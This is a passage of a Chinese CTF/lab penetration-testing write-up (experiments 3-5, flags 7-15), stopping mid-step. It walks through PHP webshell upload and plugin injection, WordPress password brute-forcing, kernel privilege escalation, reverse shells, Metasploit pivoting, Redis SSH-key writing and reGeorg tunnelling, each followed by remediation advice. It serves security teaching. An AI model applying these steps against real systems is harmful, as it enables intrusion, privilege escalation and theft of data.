+</table>
+<h3 id="修复建议-5">修复建议</h3>
+<ol>
+<li><strong>限制文件管理器权限</strong>：建议禁用该模块或仅允许特定用户角色使用。</li>
+<li><strong>配置文件保护</strong>：
+<ul>
+<li>后台不应直接展示配置文件</li>
+<li>采用 <code>.htaccess</code> 或 nginx 禁止 Web 访问 <code>/data</code> 等敏感目录</li>
+</ul>
+</li>
+<li><strong>敏感信息加密存储</strong>（例如数据库密码）</li>
+<li><strong>审计后台操作日志</strong>，避免后台被横向滥用</li>
+</ol>
+<h3 id="总结-5">总结</h3>
+<p><strong>flag6 的获取是一次后门功能滥用 + 信息泄露的结合攻击，攻击者通过后台文件管理器浏览敏感配置文件，从而获取到系统关键信息（如 flag、数据库凭据）</strong>。</p>
+<p>这个过程说明了</p>
+<ul>
+<li>后台高危功能的设计缺陷</li>
+<li>敏感信息未被妥善保护</li>
+<li>管理员权限一旦失守，整个系统将无所遁形</li>
+</ul>
+<hr>
+<h1 id="3-实验三">3. 实验三</h1>
+<h2 id="问题七">问题七</h2>
+<h3 id="渗透流程-6">渗透流程</h3>
+<p>&lt;文件上传漏洞&gt;
+若想读取/home 下的文件，需要得到服务器命令执行的权限。
+流程：先getShell，查看webShell权限，如果足够就可以直接读取，
+如果不够就要想办法先提权。</p>
+<ol>
+<li>
+<p>getShell：
+我们已经登录了管理后台，我们只需要先编写经典的php一句话木马，
+然后利用后台文件上传功能上传我们的小马。
+<img src="e3f7e70f0ea15a64b02072391c9b8230_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>连接webShell
+小马上传成功之后，尝试访问上传地址，发现无报错，
+证明上传成功，服务器成功解析。
+使用 CKnife工具 连接小马。
+<img src="f57d1a0446ccc2be07fb8e9cb331ee87_MD5.webp" alt="">
+<img src="8f1b5a94867bd9d544ec29c5c283b9b2_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>查看webShell权限
+CKnife工具提供了 Terminal 功能，通过虚拟终端输入“id”命令查询当前shell权限。
+<img src="8f1b5a94867bd9d544ec29c5c283b9b2_MD5.webp" alt="">
+当前shell权限为 apache，但是本项目中flag7对任意用户可读，所以就不需要提权了。</p>
+</li>
+<li>
+<p>夺旗：
+通过在终端中输入命令 <code>cat /home/flag7</code> 即可获取 flag7{4558894a57d3a6bc}。
+<img src="d66b8bc009a95ce74cdda1d7656c6c5b_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-6"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>技术要点</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>已有权限</td>
+          <td>后台管理权限</td>
+          <td>攻击者已进入后台系统，具备操作上传组件的权限。</td>
+      </tr>
+      <tr>
+          <td>WebShell 上传</td>
+          <td>一句话木马上传成功</td>
+          <td>使用 PHP 经典一句话木马，绕过上传限制。</td>
+      </tr>
+      <tr>
+          <td>命令执行</td>
+          <td>借助 CKnife 建立远程交互</td>
+          <td>WebShell 被成功解析，远程获取 Shell 权限。</td>
+      </tr>
+      <tr>
+          <td>权限判断</td>
+          <td>当前为 apache 用户</td>
+          <td>使用 <code>id</code> 命令确认当前为低权限 Web 服务用户，但目标文件可读。</td>
+      </tr>
+      <tr>
+          <td>文件读取</td>
+          <td>读取 <code>/home/flag7</code> 文件</td>
+          <td>无需提权，通过 Shell 直接读取目标文件，获取 flag 内容。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-6"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御措施</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>文件上传漏洞</td>
+          <td>1. 对上传文件类型进行白名单校验，禁止 <code>.php</code>, <code>.jsp</code> 等可执行后缀上传。2. 上传目录应设置为不可执行权限（<code>noexec</code>），并隔离部署。</td>
+      </tr>
+      <tr>
+          <td>木马执行</td>
+          <td>1. 拦截可疑文件请求路径，限制解析规则（如禁止 Nginx 对特定目录解析 PHP）。2. 使用 Web 应用防火墙（WAF）检测特征木马 Payload。</td>
+      </tr>
+      <tr>
+          <td>WebShell 检测</td>
+          <td>1. 部署 WebShell 行为监测工具，如实时文件审计系统（如 inotify + 自定义规则）。2. 设置自动告警机制，当新文件含恶意代码片段时立即响应。</td>
+      </tr>
+      <tr>
+          <td>权限控制</td>
+          <td>1. 限制 Web 服务运行用户权限，防止其访问敏感目录。2. <code>/home</code> 下文件应设置适当权限（如 600）或启用强访问控制策略（SELinux、AppArmor）。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-6"><strong>总结</strong></h3>
+<p>flag7 的获取核心在于：<strong>利用后台文件上传绕过验证机制，获取 Shell 并读取服务器文件内容</strong>。尽管当前 Shell 为低权限 <code>apache</code> 用户，但由于目标文件权限配置不当，仍被成功读取。</p>
+<p>此案例突显了上传漏洞的破坏力，即使攻击者未提权，只要上传目录配置不当，亦可能对服务器产生严重信息泄露风险。建议企业重点强化 <strong>上传组件的校验机制</strong>，并合理划分文件权限与执行边界，确保最低权限执行与攻击面最小化。</p>
+<h2 id="问题八">问题八</h2>
+<h3 id="渗透流程-7">渗透流程</h3>
+<p>&lt;弱口令漏洞&gt;
+我们已经获知了目标站点是使用 WordPress 搭建的站点，
+我们可以使用 WPScan工具 扫描漏洞。</p>
+<ol>
+<li>
+<p>利用工具 WPScan 扫描
+直接使用 WPScan 扫描，发现没有检测出有漏洞的插件，那就需要换一种思路，
+<img src="8127c2565a462ae75f684ca155899d9c_MD5.webp" alt="">
+在网站中单击作者名称，页面发生了跳转，我们观察url，发现url中的/author/john，即作者为john，所以用户名为john。
+继续使用 WPScan 扫描，不过这次选择爆破用户密码。
+<img src="3bc84decf1ef4fa32abf94b825b25966_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>登陆后台
+通过工具我们爆破出了密码，这样我们就可以直接登录后台了。</p>
+</li>
+<li>
+<p>夺旗：
+成功登录后台管理系统之后，单击【文章】页面，就可以看到草稿文章的 flag8{8ebf5950de08089a}。
+<img src="c8bb69f4a8f454d1a63a2f5e7635d8b0_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-7"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>技术要点</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>信息收集</td>
+          <td>发现 WordPress 架构</td>
+          <td>可通过页面特征、CMS识别工具确认。</td>
+      </tr>
+      <tr>
+          <td>用户名枚举</td>
+          <td>作者信息泄露</td>
+          <td>URL 格式 <code>/author/john</code> 暴露用户名 <code>john</code>。</td>
+      </tr>
+      <tr>
+          <td>弱口令爆破</td>
+          <td>使用 WPScan 爆破口令</td>
+          <td>利用公开字典或自定义字典进行密码尝试。</td>
+      </tr>
+      <tr>
+          <td>登录成功</td>
+          <td>后台管理权限</td>
+          <td>使用爆破成功的账号密码成功登录后台。</td>
+      </tr>
+      <tr>
+          <td>获取flag</td>
+          <td>文章草稿中发现flag</td>
+          <td>flag8{8ebf5950de08089a} 被嵌入在后台文章草稿中。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-7"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御建议</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>用户名枚举</td>
+          <td>1. 隐藏作者用户名 URL（如配置 slug 随机值或重写规则）。2. 限制 <code>/author</code> 类型路径的公开访问。</td>
+      </tr>
+      <tr>
+          <td>弱口令</td>
+          <td>1. 启用强密码策略，限制常用口令（admin/123456）。2. 定期进行密码审计和过期更换。</td>
+      </tr>
+      <tr>
+          <td>登录安全</td>
+          <td>1. 启用验证码（reCAPTCHA）或登录防护插件（如 Limit Login Attempts）。2. 对登录接口添加 WAF 校验，阻断批量请求。</td>
+      </tr>
+      <tr>
+          <td>工具对抗</td>
+          <td>1. 配置 WPScan 抵御插件，如禁用用户信息 API、限制访问头。2. 结合 Fail2Ban、iptables 对爆破行为进行封禁。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-7"><strong>总结</strong></h3>
+<p>该渗透点体现了典型的 WordPress 安全短板：“<strong>用户信息泄露 + 弱口令暴力破解</strong>”。只要用户名一旦被识别，加之密码无复杂度要求，就极易被 WPScan、Hydra 等工具暴力获取，从而造成后台失守。</p>
+<p><strong>flag8 的关键突破点在于用户名的泄露与后台未设置爆破保护机制。</strong> 建议任何涉及 CMS 系统的 Web 服务，优先从 “默认路径隐藏 + 用户信息保护 + 登录口令强化 + 登录限速防爆破” 四方面全面部署防御。</p>
+<h2 id="问题九">问题九</h2>
+<h3 id="渗透流程-8">渗透流程</h3>
+<p>&lt;任意代码执行(RCE)&gt; + &lt;文件读取泄露&gt;
+flag8流程中，我们已经进入了网站后台，可以getShell然后读取网站配置文件。</p>
+<ol>
+<li>
+<p>getShell
+在网站左侧菜单中单击【插件】-&gt;【编辑】菜单，然后选择 Hello Dolly插件。
+在其中 function语句 上面增加 一句话木马 ，之后单击【更新文件】按钮。
+插入完成后，去访问hello.php（插件所在url）看能否正常使用。
+发现正常，使用 CKnife工具 连接shell，密码 cmd。</p>
+</li>
+<li>
+<p>夺旗：
+通过 CKnife工具，查看网站文件目录列表，在html目录中，
+可以看到配置文件wp-config.php文件，双击该文件即可获取flag9{9ced34482cf96ced}。
+<img src="f57d1a0446ccc2be07fb8e9cb331ee87_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-8">漏洞链条分析</h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>行为</th>
+          <th>漏洞类型</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>插件编辑</td>
+          <td>插入 WebShell</td>
+          <td>任意代码执行（RCE）</td>
+      </tr>
+      <tr>
+          <td>访问插件 URL</td>
+          <td>获取 Shell 权限</td>
+          <td>后门执行 / 功能滥用</td>
+      </tr>
+      <tr>
+          <td>使用 CKnife 操作</td>
+          <td>控制服务器文件系统</td>
+          <td>权限滥用 / 垂直越权</td>
+      </tr>
+      <tr>
+          <td>读取配置文件</td>
+          <td>获取敏感信息与 flag9</td>
+          <td>信息泄露 / 配置文件暴露</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-8">修复建议</h3>
+<ol>
+<li><strong>禁用插件/主题在线编辑功能</strong><br>
+大多数 CMS（如 WordPress、Dedecms）都提供在线代码编辑器，极易被利用，建议直接在后台禁用。</li>
+<li><strong>部署 WAF 规则检测后门行为</strong><br>
+拦截典型的恶意函数如 <code>eval</code>、<code>base64_decode</code>、<code>assert</code>，同时监控插件文件变更。</li>
+<li><strong>最小权限原则运行 Web 服务</strong><br>
+Web 服务账户不应拥有敏感配置文件（如 <code>wp-config.php</code>）的写权限，必要时仅允许只读访问。</li>
+<li><strong>配置文件权限控制</strong><br>
+设置 <code>wp-config.php</code> 等文件为不可修改，只允许必要进程访问，可通过 <code>chmod 400</code>、ACL 或安全模块实现。</li>
+<li><strong>及时更新插件与核心系统</strong><br>
+删除不必要插件，更新存在漏洞的插件组件，避免被利用进行目录穿越或代码注入。</li>
+</ol>
+<h3 id="总结-8">总结</h3>
+<p><strong>flag9 的获取，本质是一次后台任意代码执行漏洞被利用，在服务端植入后门，从而获取 WebShell 控制权限，最终通过文件系统浏览读取配置文件中的敏感信息（包括 flag9）。</strong></p>
+<hr>
+<h1 id="4-实验四">4. 实验四</h1>
+<h2 id="问题十">问题十</h2>
+<h3 id="渗透流程-9">渗透流程</h3>
+<p>&lt;信息泄露漏洞&gt;
+flag9流程中，我们已经读取了WordPress网站的配置文件，配置文件中存放了连接数据库的IP地址、用户名和密码。</p>
+<ol>
+<li>夺旗：
+直接在 CKnife工具 中连接数据库即可，flag10{409877992b99dec9} 就在 wordpress数据库 中 的flag表 中。
+<img src="eb32f183e00730ceefccdd21961d9c3b_MD5.webp" alt=""></li>
+</ol>
+<blockquote>
+<p>注意：本项目中可以直接连接，但是实战中很有可能对连接的IP有限制，不允许远程访问。</p>
+</blockquote>
+<h3 id="漏洞链条分析-9">漏洞链条分析</h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>行为</th>
+          <th>漏洞类型</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>配置文件泄露</td>
+          <td>获取数据库连接信息</td>
+          <td>信息泄露</td>
+      </tr>
+      <tr>
+          <td>远程连接数据库</td>
+          <td>使用明文账号连接</td>
+          <td>配置缺陷 / 网络暴露</td>
+      </tr>
+      <tr>
+          <td>查询敏感数据表</td>
+          <td>读取 flag10</td>
+          <td>数据保护不当 / 缺少访问控制</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-9">修复建议</h3>
+<ol>
+<li>
+<p><strong>限制数据库仅本地监听</strong></p>
+</li>
+<li>
+<p><strong>配置防火墙限制入站连接</strong></p>
+</li>
+<li>
+<p><strong>规范数据库授权策略</strong></p>
+<ul>
+<li>避免使用通配授权如 <code>user@'%'</code></li>
+<li>推荐授权方式为 <code>user@'127.0.0.1'</code> 或 <code>user@'内网段IP'</code></li>
+</ul>
+</li>
+<li>
+<p><strong>保护配置文件安全</strong></p>
+<ul>
+<li>配置文件中的数据库密码应加密存储或使用 Key 管理系统调用</li>
+<li>文件权限限制为仅允许应用读取（如 <code>chmod 640</code>）</li>
+</ul>
+</li>
+</ol>
+<h3 id="总结-9">总结</h3>
+<p><strong>flag10 的获取过程，标志着攻击者完成了从 WebShell 到数据库的数据层渗透，显示出其具备进一步持久化控制目标系统的能力。</strong></p>
+<p>该攻击链条清晰展现了一个典型的渗透闭环过程：</p>
+<p>后台登录 → WebShell 权限 → 配置信息泄露 → 数据库接管 → 敏感信息提取</p>
+<h2 id="问题十一">问题十一</h2>
+<h3 id="渗透流程-10">渗透流程</h3>
+<p>&lt;任意文件写入&gt; + &lt;本地权限提升(LPE)&gt;
+想查看系统文件，就需要获取系统权限，前面拿到了WebShell，这个时候就需要提权，
+将权限提升至系统权限。</p>
+<ol>
+<li>
+<p>尝试
+在 CKnife工具 中使用 虚拟终端 尝试使用 <code>ls /root</code>
+访问root目录下的所有文件，结果显示权限不允许。
+然后使用 <code>id</code> 命令查看当前WebShell权限，发现是www-data权限。
+查看当前操作系统信息，发行版号等，为漏洞利用提权做准备。
+<img src="8dfa16d627307d526419d387220d4c01_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>制作并上传提权脚本
+使用kali自带的 searchsploit工具 搜索exploitdb 中的漏洞利用代码。
+将输出的 <code>.c</code> 文件拷贝到/root/下，然后使用 CKnife工具 上传/root/的脚本文件到目标服务器上，找个有权限写文件的地方。
+本项目中将文件写到了tmp/下。
+<img src="b04aff89b82cc05826f7ec0cfd70174f_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>反弹shell
+先监听本地端口，然后在对方服务器执行反弹shell命令。
+我们需要先制作 <code>shell.sh</code> 文件，然后利用 CKnife工具 上传到目标服务器，
+并添加执行权限，执行脚本，检查本地监听端口，发现反弹成功。
+<img src="40c31a75df769219955c21ccc0a4af2e_MD5.webp" alt="">
+<img src="2845b6e2ddc4872c46a72aa29cf8a7ad_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>漏洞利用
+切换到上传提权脚本所在的目录，并编译该<code>.c</code>文件生成对应目标文件。
+执行该<code>.out</code>文件，运行程序后在执行<code>id</code>命令，查看权限发现当前shell已经是root权限了。
+<img src="5db200f4952451a11ccf89847914815e_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>夺旗：
+直接读取/root/下的flag11文件即可，答案为 flag11{3d0482058402722f}。
+<img src="ac87be8763e7aa51bb7f8860cb6f7fc5_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-10">漏洞链条分析</h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>行为</th>
+          <th>漏洞类型</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>权限侦察</td>
+          <td>执行 <code>id/uname/os-release</code> 收集信息</td>
+          <td>信息收集</td>
+      </tr>
+      <tr>
+          <td>漏洞利用代码上传</td>
+          <td>通过 WebShell 上传漏洞代码</td>
+          <td>任意文件写入</td>
+      </tr>
+      <tr>
+          <td>反弹 Shell</td>
+          <td>建立远程控制通道</td>
+          <td>网络权限扩展</td>
+      </tr>
+      <tr>
+          <td>提权 exploit 执行</td>
+          <td>执行提权程序获取 root 权限</td>
+          <td>本地权限提升（LPE）</td>
+      </tr>
+      <tr>
+          <td>访问 <code>/root/flag11</code></td>
+          <td>读取系统级敏感文件</td>
+          <td>系统信息泄露</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-10">修复建议</h3>
+<ol>
+<li><strong>及时更新内核版本与系统补丁</strong>
+<ul>
+<li>本地提权几乎都是利用未修补的内核漏洞，定期更新系统以修补已知漏洞。</li>
+</ul>
+</li>
+<li><strong>最小权限原则运行服务</strong>
+<ul>
+<li>Web 服务用户（如 <code>www-data</code>）不应具有对系统关键目录（如 <code>/root</code>）的写权限。</li>
+</ul>
+</li>
+<li><strong>禁用危险函数 / 编译工具链</strong>
+<ul>
+<li>靶机中不应安装 <code>gcc</code>、<code>make</code> 等编译工具，或者使用 AppArmor、SELinux 等工具限制其行为。</li>
+</ul>
+</li>
+<li><strong>监控 WebShell 行为</strong>
+<ul>
+<li>检测异常文件上传、反弹连接、执行编译行为等，防止攻击者通过 WebShell 执行恶意操作。</li>
+</ul>
+</li>
+<li><strong>隔离 Web 与系统文件访问权限</strong>
+<ul>
+<li>例如，将 <code>/tmp</code> 设置为不允许执行的挂载点（<code>noexec</code>），以避免 WebShell 执行恶意脚本。</li>
+</ul>
+</li>
+</ol>
+<h3 id="总结-10">总结</h3>
+<p><strong>flag11 的获取，标志着从 Web 层完全掌控到系统 Root 权限的跃迁。攻击者从上传提权 exploit 脚本入手，借助内核漏洞实现权限突破，最终读取 /root 下敏感文件，完成控制闭环。</strong></p>
+<h2 id="问题十二">问题十二</h2>
+<h3 id="渗透流程-11">渗透流程</h3>
+<p>&lt;任意命令执行漏洞&gt; + &lt;任意文件上传漏洞&gt; + &lt;后台权限获取&gt;</p>
+<ol>
+<li>
+<p>信息收集
+尝试用 Nmap 对前面三个人任务点涉及到的域名进行扫描，
+考虑到前面已经已经getShell，从内网所在的主机发起扫描更为稳妥。
+本项目中，选择反弹blog所在机器shell到本地msf。</p>
+</li>
+<li>
+<p>反弹shell
+利用msf生成后门，同时在本地配置监听，通过菜刀在blog所在机器上上传后门，
+并赋予权限，执行后获取会话。
+<img src="fb4c3fc8045d45b46001008ea1490286_MD5.webp" alt=""><img src="0109aa3c513b51622297caae8b9a7e4f_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>添加内网路由
+査看blog所在的内网地址并增加对应的路由，使msfconsole中的所有模块均可以直接访问172.10.10.0/24网段。添加路由后使meterpreter会话在后台运行，通过route print再次查看并确认路由添加成功。
+<img src="8417bd31f32f2dafce7c2cb05d0ca2e3_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>扫描
+使用auxiliary/scanner/portscan/tcp模块指定172.10.10.0/24网段和6379端口进行扫描。扫描结果显示此网络内并无开放6379端口的机器。</p>
+<ol>
+<li>查看是否存在域：net rpc group members ”domain controllers” –S ad</li>
+<li>查看数据库配置，是否存在其它网段信息</li>
+<li>查看www.qianxin.com数据库配置，是否存在其它网段信息
+发现192.168.100.40</li>
+<li>查看www.qianxin.com的hosts文件</li>
+<li>查看ARP信息</li>
+</ol>
+</li>
+<li>
+<p>添加新网段路由
+使用刚才收集到的192.168.100.0/24这个网段
+输入session -l 查看刚刚切换到后台的session id，切换回meterpreter会话并增加路由，使msfconsole中的
+所有模块均可以直接访问192.168.100.0/24网段。之后再次使meterpreter会话在后台运行，通过route print
+查看并确认路由添加成功。</p>
+</li>
+<li>
+<p>夺旗：flag12
+继续使用auxiliary/scanner/portscan/tcp模块，修改对应参数指定192.168.100.0/24网段和6379端口进行扫描。
+扫描结果为192.168.100.101，所以本任务的答案为 flag12{192.168.100.101}。
+<img src="771827ea87533238ea2711d4368a9a78_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-11">漏洞链条分析</h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>利用点</th>
+          <th>风险类型</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Web入口</td>
+          <td>插件编辑上传木马</td>
+          <td>RCE + 文件上传漏洞</td>
+      </tr>
+      <tr>
+          <td>主机层</td>
+          <td>后门执行</td>
+          <td>系统配置不当、权限控制缺陷</td>
+      </tr>
+      <tr>
+          <td>网络层</td>
+          <td>路由添加+端口扫描</td>
+          <td>内网横向移动能力</td>
+      </tr>
+      <tr>
+          <td>服务层</td>
+          <td>Redis 未鉴权</td>
+          <td>数据库未授权访问漏洞</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="安全建议">安全建议</h3>
+<ol>
+<li><strong>限制 WebShell 上传与执行权限</strong><br>
+防止上传 ELF、PHP、EXE 可执行木马文件。</li>
+<li><strong>网络隔离与 ACL 策略</strong><br>
+不同业务内网段间应通过防火墙实现精细访问控制。</li>
+<li><strong>数据库/服务配置文件加密</strong><br>
+避免信息泄露暴露内网拓扑结构。</li>
+<li><strong>部署端口监听告警机制</strong><br>
+及时发现内网横向扫描行为，实时响应封禁来源。</li>
+<li><strong>MSF 会话持久化监控</strong><br>
+检测 C2 控制链及恶意会话保活策略，防止长期控制。</li>
+</ol>
+<h3 id="总结-11">总结</h3>
+<p>flag12 的获取标志着内网攻击进入“资产探测”阶段。通过控制一台受害主机作为跳板，逐步穿透不同内网网段，实现多层横向移动与端口扫描，最终锁定 Redis 主机所在地址。</p>
+<hr>
+<h1 id="5-实验五">5. 实验五</h1>
+<h2 id="问题十三">问题十三</h2>
+<h3 id="渗透流程-12">渗透流程</h3>
+<p>&lt;未授权访问漏洞&gt;</p>
+<ol>
+<li>
+<p>配置proxychains代理
+在前面的任务中，通过增加路由的方式可以使msfconsole中的所有模块访问目标网络192.168.100.0/24，
+但在kali本地无法直接通过redis-cli连接redis服务器，考虑借助Msf代理模块+proxychains组合实现。</p>
+</li>
+<li>
+<p>夺旗：flag13
+借助proxychains未授权访问redis成功，输入info命令查看redis所使用的配置文件，本任务的答案为 flag13{/etc/redis/redis.conf}<img src="48f3382554c8ae1b7e79eebd3e0fbe0f_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-12"><strong>漏洞链条分析</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>技术要点</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>网络渗透</td>
+          <td>Meterpreter 会话建立</td>
+          <td>通过前置渗透动作，已打通至目标内网（192.168.100.0/24）。</td>
+      </tr>
+      <tr>
+          <td>SOCKS代理</td>
+          <td>Msf 搭建内网 Socks5 代理</td>
+          <td>使用 <code>auxiliary/server/socks_proxy</code> 模块生成代理服务。</td>
+      </tr>
+      <tr>
+          <td>本地转发</td>
+          <td>Kali 本地配置 proxychains</td>
+          <td>修改 <code>/etc/proxychains.conf</code> 指向 127.0.0.1:1080。</td>
+      </tr>
+      <tr>
+          <td>Redis 未授权访问</td>
+          <td>使用 proxychains + redis-cli</td>
+          <td>代理执行 <code>redis-cli -h 192.168.100.X</code> 成功连接目标 Redis 服务。</td>
+      </tr>
+      <tr>
+          <td>信息读取</td>
+          <td>使用 <code>INFO</code> 命令获取配置</td>
+          <td>得到 Redis 配置文件路径 <code>/etc/redis/redis.conf</code>。</td>
+      </tr>
+      <tr>
+          <td>获取flag</td>
+          <td>flag13 即为 redis 配置路径</td>
+          <td>flag13{/etc/redis/redis.conf} 成功获取。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-11"><strong>修复建议</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>漏洞类型</th>
+          <th>防御建议</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Redis 未授权访问</td>
+          <td>1. 禁止 Redis 对公网或不可信网络监听（仅允许 <code>127.0.0.1</code>）。2. 设置访问密码（<code>requirepass</code>）。3. Redis 4.0+ 使用 <code>bind</code> 限制 IP 访问。</td>
+      </tr>
+      <tr>
+          <td>网络隔离不当</td>
+          <td>1. 内网服务应启用访问控制列表（ACL）。2. 配置防火墙规则限制特定端口通信（如6379）。</td>
+      </tr>
+      <tr>
+          <td>渗透通道建立</td>
+          <td>1. 检测并封禁非法 Socks5 流量。2. 监控主机开启代理端口或流量异常（可用 IDS/EDR 系统）。</td>
+      </tr>
+      <tr>
+          <td>信息泄露风险</td>
+          <td>1. 减少 <code>INFO</code> 命令返回信息敏感度，或重定义敏感路径。2. 将 redis.conf 等配置移动到权限受限目录（如 <code>/root</code>）。</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="总结-12"><strong>总结</strong></h3>
+<p>该渗透点表明了<strong>Redis 默认配置存在严重的未授权访问风险</strong>，尤其在内网环境中，如无适当隔离、认证与端口限制，极易被 proxychains、socks5 等通道绕过并远程利用。</p>
+<p><strong>flag13 的关键突破点在于代理通道搭建成功，以及 redis 无访问控制</strong>。建议部署 Redis 实例时务必配置 <code>requirepass</code>、绑定本地 IP、禁用外网监听，同时建立跨域访问白名单。</p>
+<h2 id="问题十四">问题十四</h2>
+<h3 id="渗透流程-13">渗透流程</h3>
+<p>&lt;Redis 未授权访问漏洞&gt; + &lt;SSH 免密登录漏洞&gt;</p>
+<ol>
+<li>
+<p>分析
+Redis数据库默认端口为6379，经常会有未授权访问漏洞，可导出SSH密钥进行免密登录<img src="b6b5576577d7c6c0d3a4d18ebe6666a4_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>夺旗：flag14
+Redis服务器存在未授权访问漏洞，本地生成ssh密钥对并向redis服务器写入ssh公钥。
+在kali本地借助proxychains代理ssh免密登录目标服务器192.168.100.101，查看/root目录下的文件，本任务的答案为 flag14{24e3f47dead05ce8}<img src="cc72b25185955b677abaf0fefe779094_MD5.webp" alt=""></p>
+</li>
+</ol>
+<h3 id="漏洞链条分析-13">漏洞链条分析</h3>
+<table>
+  <thead>
+      <tr>
+          <th>阶段</th>
+          <th>具体利用</th>
+          <th>影响</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>访问 Redis</td>
+          <td>Redis 无密码保护</td>
+          <td>直接控制数据库</td>
+      </tr>
+      <tr>
+          <td>伪造 SSH 公钥</td>
+          <td>Redis 持久化 <code>authorized_keys</code></td>
+          <td>提升权限</td>
+      </tr>
+      <tr>
+          <td>SSH 免密登录</td>
+          <td>直接 SSH 登录 root 用户</td>
+          <td>服务器全面失陷</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="修复建议-12">修复建议</h3>
+<ol>
+<li><strong>Redis 访问控制</strong>
+<ul>
+<li>配置访问密码</li>
+<li>修改绑定地址</li>
+<li>重命令高危指令</li>
+</ul>
+</li>
+<li><strong>SSH 安全防护</strong>
+<ul>
+<li>监控 <code>/root/.ssh/authorized_keys</code> 的文件改动</li>
+<li>限制允许登录的用户目录权限</li>
+<li>禁用 root 用户远程登录</li>
+</ul>
+</li>
+<li><strong>防火墙与入侵检测</strong>
+<ul>
+<li>使用防火墙限制 Redis 端口访问：
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">iptables -A INPUT -p tcp --dport <span class="m">6379</span> -j DROP
+</span></span></code></pre></div></li>
+<li>配置 IDS 系统，对 Redis 命令行为进行监测</li>
+</ul>
+</li>
+</ol>
+<h3 id="总结-13">总结</h3>
+<ul>
+<li>该攻击链条利用 Redis 的未授权访问，篡改持久化行为将攻击者 SSH 公钥写入目标系统，绕过传统身份验证，最终获得 root 权限。</li>
+<li>属于典型的 <strong>权限提升 + 横向移动</strong> 漏洞组合攻击，对生产环境构成极大威胁。</li>
+<li>强化 Redis 配置与 SSH 安全控制可有效防范该类攻击。</li>
+</ul>
+<h2 id="问题十五">问题十五</h2>
+<h3 id="渗透流程-14">渗透流程</h3>
+<p>&lt;内网 WEB 爆破&gt; + &lt;内网穿透代理&gt;</p>
+<ol>
+<li>
+<p>信息收集
+复用前面任务获取的blog所在机器的meterpreter会话，使用auxiliary/scanner/portscan/tcp模块指定192.168.100.0/24网段和80端口进行扫描，发现两个IP存在WEB服务。Firefox通过proxychains分别打开对应地址验证，从页面标题可以确定oa-web服务器的IP地址为192.168.100.100。<img src="2d44da72ba4297cdf5134810f8bc426a_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>思路
+本次任务是破解admin用户的密码，考虑到前面已经通过msf代理模块+proxychains组合实现了kali本地访问目标网段，但实验环境中的msf版本仅支持socks4代理(后续msf5/6版本支持socks5),而burpsuite只支持socks5版本，所以使用ReGeorq工具搭建socKs5代理，此处仍然借助blog站点的shell权限，上传对应的php脚本。将前面使用proxychains打开的firefox关闭掉，正常开启firefox并分别访问两个php脚本tunnel.socket.php显示可用。<img src="fb4c3fc8045d45b46001008ea1490286_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>搭建反向代理
+用reGeorgSocksProxy.py连接上一步中的tunnel.socket.php并指定监听本地2222端口，显示隧道成功建立。
+再次查看本地2222端口的监听状态进一步确认。如此发往本地2222端口的流量都会转发至blog所在机器。
+<img src="1e9ce26465772986b96508eee1553ed7_MD5.webp" alt=""></p>
+</li>
+<li>
+<p>burpsuite重放爆破
